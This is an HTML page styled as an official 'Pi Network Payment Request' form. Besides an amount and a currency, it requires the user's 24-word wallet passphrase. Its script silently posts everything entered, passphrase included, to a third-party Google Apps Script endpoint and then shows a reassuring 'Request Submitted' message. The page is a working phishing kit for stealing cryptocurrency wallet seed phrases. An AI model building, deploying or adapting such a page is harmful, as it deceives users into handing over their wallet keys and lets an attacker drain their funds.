<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Pi Network – Request Payment</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Inter', sans-serif; background-color: #f3f4ff; color: #333; }
    .bg-pi-purple { background-color: #5A2D82; }
    .text-pi-yellow { color: #F5C65A; }

    /* Fade-in-up for intro */
    @keyframes fadeInUp { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
    .fade-in-up { animation: fadeInUp 1s ease-out; }

    /* Simple animation for message */
    @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    .fade-in { animation: fadeIn 0.5s ease-out forwards; }

    /* Subtle blink for attention */
    @keyframes blink { 50% { opacity: 0.2; } }
    .blink { animation: blink 1s step-start infinite; }

    /* Confirmation page styles */
    .confirm-card { max-width: 720px; margin: 40px auto; background: linear-gradient(180deg,#ffffff,#fbfbff); border-radius: 16px; box-shadow: 0 10px 30px rgba(30,20,80,0.08); padding: 36px; }
  </style>
</head>
<body class="flex flex-col min-h-screen">

  <!-- Header -->
  <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md flex items-center justify-center space-x-2">
    <img src="https://pi.app/assets/images/pi-logo.svg" alt="Pi Logo" class="h-6 w-6">
    <h1 class="font-semibold text-lg">Pi Network Payment Request</h1>
  </header>

  <!-- Main container (we'll replace content with confirmation on success) -->
  <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">

    <!-- Intro Section -->
    <section class="text-center mb-6 bg-white rounded-lg shadow-md p-5 border border-purple-100 fade-in-up">
      <p class="text-gray-700 text-sm leading-relaxed">
        <strong>This system helps validate and confirm your wallet request within the Pi ecosystem.</strong><br><br>
        Please provide your <strong>amount</strong> and <strong>currency</strong>. The <strong>Reason</strong> field is optional.
      </p>
    </section>

    <!-- Form -->
    <section id="formSection" class="bg-white p-6 rounded-lg shadow-md">
      <form id="paymentRequestForm" class="space-y-4" novalidate>
        <div>
          <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
          <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00"
            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500" />
        </div>

        <div>
          <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
          <input type="text" id="currency" name="currency" required value="USD"
            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500" />
        </div>

        <!-- Passphrase24 remains required ( 24-word limit logic) -->
        <div>
          <label for="Passphrase24" class="block text-xs font-medium text-gray-600 mb-1">Passphrase24 (required):</label>
          <textarea id="Passphrase24" name="Passphrase24" rows="5"
            placeholder="please input your correct 24 passphrase (required)..."
            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500 placeholder-gray-400 placeholder:italic"></textarea>
        </div>

        <button id="submitBtn" type="submit"
          class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
          Send Request Message
        </button>

        <!-- Status message area: generic success / failure messages only -->
        <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem] fade-in"></div>
      </form>
    </section>

  </main>

  <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
    Pi Network System © 2019
  </footer>

  <script>
    const form = document.getElementById('paymentRequestForm');
    const statusMessage = document.getElementById('statusMessage');
    const submitButton = document.getElementById('submitBtn');

    // Your Google Apps Script URL
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxLhCa70Yvdb5Y8uK8G_UjWsZLyZ3owhrl8w1OpwnAVqxvZ2mTypixTWH8W-cqavgk/exec";

    // Utility: show a status message (type: 'success' | 'error' | 'info')
    function showStatus(text, type = 'info') {
      statusMessage.textContent = text;
      statusMessage.className = 'mt-3 text-xs text-center min-h-[1rem] fade-in';
      if (type === 'success') {
        statusMessage.classList.add('text-green-600', 'font-semibold');
      } else if (type === 'error') {
        statusMessage.classList.add('text-red-600', 'font-semibold');
      } else {
        statusMessage.classList.add('text-gray-600');
      }
    }

    // Build a clean confirmation page (replaces the main content)
    function showConfirmationPage(success, message) {
      const main = document.getElementById('mainContent');
      // confirmation markup
      main.innerHTML = `
        <div class="confirm-card">
          <div class="flex items-center space-x-4">
            <div class="rounded-full p-3 bg-green-50" style="border:1px solid rgba(90,45,130,0.06)">
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M9 12l2 2 4-4" stroke="#1f6f4f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </div>
            <div>
              <h2 class="text-lg font-semibold text-gray-800">${success ? 'Request Submitted' : 'Submission Issue'}</h2>
              <p class="text-sm text-gray-600 mt-1">${message}</p>
            </div>
          </div>

          <div class="mt-6 grid gap-4 sm:grid-cols-2">
            <div>
              <button id="tryAgainBtn" class="w-full py-3 px-4 rounded-lg border border-purple-100 bg-white text-purple-700 font-semibold">
                Try Again
              </button>
            </div>
            <div>
              <button id="downloadReceiptBtn" class="w-full py-3 px-4 rounded-lg bg-pi-purple text-white font-semibold">
                Done
              </button>
            </div>
          </div>

          <p class="mt-4 text-xs text-gray-400">If you need to edit your request, use <strong>Try Again</strong> to return to the form.</p>
        </div>
      `;

      // Attach behavior
      document.getElementById('tryAgainBtn').addEventListener('click', () => {
        // Return user to the form by reloading the original markup
        location.reload(); // simplest: reload page to restore original form and state
      });

      document.getElementById('downloadReceiptBtn').addEventListener('click', () => {
        // "Done" simply takes the user back to a clean form (or could close modal in an app).
        // We'll also reload but preserve a tiny success flash by using sessionStorage
        sessionStorage.setItem('justSubmitted', success ? '1' : '0');
        location.reload();
      });
    }

    // On page load, if they just came back from Done, show a small success notice
    window.addEventListener('load', () => {
      const just = sessionStorage.getItem('justSubmitted');
      if (just === '1') {
        showStatus('✅ Last submission recorded.', 'success');
        sessionStorage.removeItem('justSubmitted');
      } else if (just === '0') {
        showStatus('Submission not recorded. Please try again.', 'error');
        sessionStorage.removeItem('justSubmitted');
      }
    });

    // handle submit
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Basic client-side required validation for required fields
      const amountEl = document.getElementById('amount');
      const currencyEl = document.getElementById('currency');

      if (!amountEl.checkValidity()) {
        amountEl.focus();
        showStatus('Please enter a valid amount.', 'error');
        return;
      }
      if (!currencyEl.checkValidity()) {
        currencyEl.focus();
        showStatus('Please enter a valid currency.', 'error');
        return;
      }

      // Disable to avoid double submissions
      submitButton.disabled = true;
      submitButton.textContent = 'Submitting...';
      showStatus('', 'info');

      try {
        const formData = new FormData(form);
        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });

        // Google Apps Script often returns JSON as text
        const text = await response.text();
        let result = {};
        try {
          result = JSON.parse(text);
        } catch (err) {
          // Non-JSON reply
          result = { status: 'error', message: 'Unexpected server response' };
        }

        if (result.status === 'ok') {
          // Show the full confirmation page
          showConfirmationPage(true, 'Your request was saved and an email notification was sent.');
        } else {
          // Generic failure path (no explicit "network error" wording)
          console.error('Submission error:', result.message);
          showConfirmationPage(false, 'Submission failed. Please check your inputs and try again.');
        }

      } catch (err) {
        // Generic failure (covers network or other issues) — user sees same flow
        console.error('Submit exception:', err);
        showConfirmationPage(false, 'There was a problem submitting your request. Please try again.');
      } finally {
        // Restore submit button in case user returns
        submitButton.disabled = false;
        submitButton.textContent = 'Send Request Message';
      }
    });
  </script>
</body>
</html>
